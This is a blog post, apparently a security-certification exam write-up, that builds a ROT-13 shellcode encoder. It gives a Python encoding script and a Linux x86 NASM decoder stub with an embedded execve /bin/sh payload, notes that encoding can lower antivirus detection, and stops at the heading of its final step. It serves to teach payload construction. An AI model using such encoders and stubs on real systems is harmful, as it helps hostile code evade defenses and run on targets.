# SLAE Exam Assignment 4 - Creating a custom shellcode encoder

## Prologue
The fourth assignment that we have for our SLAE Certification exam is creating a custom shellcode encoder using all that we have learnt so far from the course.

In this blog post I am going to discuss what is a shellcode encoder, walk you guys through the creation process and at last show you a demo of what we have created.

So without any further ado, here it goes!

## Shellcode Encoder Explained
So the big question is what's a shellcode encoder?

I'd define an encoder as a piece of code that takes your shellcode as input and encodes/obfuscates/morphs it in way such that all bad characters including null bytes, new lines etc are removed from the shellcode and also appends a small stub to the shellcode which aids in decoding/changing it back to the original shellcode for execution on the target system.

This has another obvious benefit apart from removing bad characters as many of you might know from practical experience.

It obfuscates the shellcode which may hide it's true intentions from some AV/EDR solutions therefore lowering the detection rate on some site like VirusTotal but make no mistake, **AV evasion is not the primary objective of using a shellcode encoder** and it provides no real security to your payload because there's **no encryption happening** which means the encoding/obfuscation is usually trivial to reverse.

Ergo, always use encryption for implant security, AV/EDR evasion and Encoders for a preliminary obfuscation and removing bad characters. Ideally, you would want to use both first encoding and then encrypting the payload. Refer to [Blog Post 7](https://slaeryan.github.io/posts/slae-assignment7-blogpost.html) for a primer on creating your own shellcode crypter.

So with that being explained many of you might have used the famous(or rather infamous!)Shikata Ga Nai Encoder from Metasploit package to obfuscate or bypass some AVs till it got burnt out and now all payloads keep getting attributed :(

Worry not! Here's how you can create your own shellcode encoder from scratch.

## Encoding algorithm
For the purposes of this blog post I have chosen a variation _ROT-13_ of one of the earliest ciphers - _Caesar cipher_.

In other words, ROT-13 is a Caesar cipher with n=13 or every character in the original message is substituited by 13 places which means we are simply going to add 13(0x0d) to every byte in the original shellcode to obfuscate it and then subtract the same from the encoded shellcode to reverse the effect before execution.

The reasons for choosing so are simple:
1. It will be easy to implement and easy for all the readers to comprehend.
1. We don't need to bypass AVs using an encoder so we don't exactly need a very complicated chained multiple encoding schema.
1. Furthermore, I admit to being lazy :0

Plus, we can always build upon this as and when required which shouldn't be a very difficult task if we get our fundamentals clear. 

## Creating an Encoder prototype
Our first objective shall be to encode an original shellcode string using our chosen algorithm utilizing a wrapper script which will spit out the encoded shellcode string.

Here's a python script of the prototype encoder:

```python
# Name: encoder_proto.py
# Author: Upayan a.k.a slaeryan
# SLAE: 1525
# Contact: upayansaha@icloud.com
# Purpose: The script takes a shellcode hex string as input from user and
# converts it into a ROT-13 encoded shellcode byte string and prints 
# it to stdout in a format suitable for the decoder NASM stub.
# Testing: 31c050682f2f7368682f62696e89e35089e25389e1b00bcd80 (execve /bin/sh)
# Run with:
# python3 encoder_proto.py
# Note: The original shellcode cannot contain null-bytes(0x00)


def main():
	shellcode_hex = input("Enter the shellcode hex string: ")
	counter = 1
	byte = ''
	encoded_shellcode = ''
	for i in shellcode_hex:
		if (counter % 2 == 0):
			byte = byte + i
			byte = int(byte, 16)
			byte = hex(byte+13)
			if(len(byte)==3):
				byte = byte[:2] + '0' + byte[2:]
			byte = byte + ","
			encoded_shellcode = encoded_shellcode + byte
			byte = ''
		else:
			byte = byte + i
		counter += 1
	encoded_shellcode = encoded_shellcode + "0x0d"
	print("\n")
	print("The ROT-13 encoded shellcode byte string is:", encoded_shellcode)


main()
```

This script just takes a shellcode as input from user and encodes it by adding 13(0x0d to each byte and then prints it. Keep in mind, this is just the prototype encoder and it doesn't incorporate a stub for decoding yet. Also, I am not a coder so please forgive the errors which might have gone unnoticed by my eyes and the messy code in general.

Here's a demo of the prototype in action:

<script id="asciicast-yrj6KgSJj9OnZFHoCh2n91kEV" src="https://asciinema.org/a/yrj6KgSJj9OnZFHoCh2n91kEV.js" async></script>

So let's make the stub now.

## Creating a decoder NASM stub
First, let's talk about what's a stub. A stub is basically a piece of code which is usually appended to the encoded shellcode to aid in decoding and execution of the encoded shellcode. 

In other words, we want to create a Linux/x86 assembly code into which our encoded shellcode from previous step is embedded and it will execute the shellcode after decoding it successfully.

Here's the NASM source:

```nasm
; Filename: rot13_decoder_stub_shellcode.nasm
; Author: Upayan a.k.a. slaeryan
; SLAE: 1525
; Contact: upayansaha@icloud.com
; Purpose: This is a x86 Linux stub for decoding and executing a ROT-13 encoded 
; shellcode.
; Usage: ./rot13_decoder_stub_shellcode
; Compile with:
; ./compile.sh rot13_decoder_stub_shellcode
; Size of shellcode: 16 bytes(Stub)


global _start

section .text
_start:

    jmp short call_decoder     ; Using the JMP-CALL-POP technique - JMP section

    initiate_decoder:          ; Start the decoding of the shellcode - POP section
    pop esi                    ; Pop the shellcode which is in TOS into ESI register

    decoder_loop:              ; Actual decoding happens here in a loop
    sub byte [esi], 13         ; Get original shellcode by subtracting 13
    jz Shellcode               ; Break condition hits when we get 0 and transfer execution flow to decoded shellcode 
    inc esi                    ; Increment ESI to decode each and every byte
    jmp short decoder_loop     ; Run decoder_loop on every byte till we get 0 on subtracting indicating end of shellcode

    call_decoder:              ; CALL section
    call initiate_decoder      ; Goto initiate_decoder function to put the shellcode onto the stack
    ; The encoded shellcode for execve /bin/sh is defined below, change if required.
    Shellcode: db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d,0x0d
```

We are using the JMP-CALL-POP technique here to subtract every byte by 13(0x0d) which will get our original shellcode back and then we transfer our execution flow to the original shellcode. The code is commented on every line to help us understand what's going on in each step and honestly there's not much to explain here.

Here's a demo of the stub in action:

<script id="asciicast-zHWcBIMJJiDi5pmqCiQpmwrTg" src="https://asciinema.org/a/zHWcBIMJJiDi5pmqCiQpmwrTg.js" async></script>

## Final step: Creating the Encoder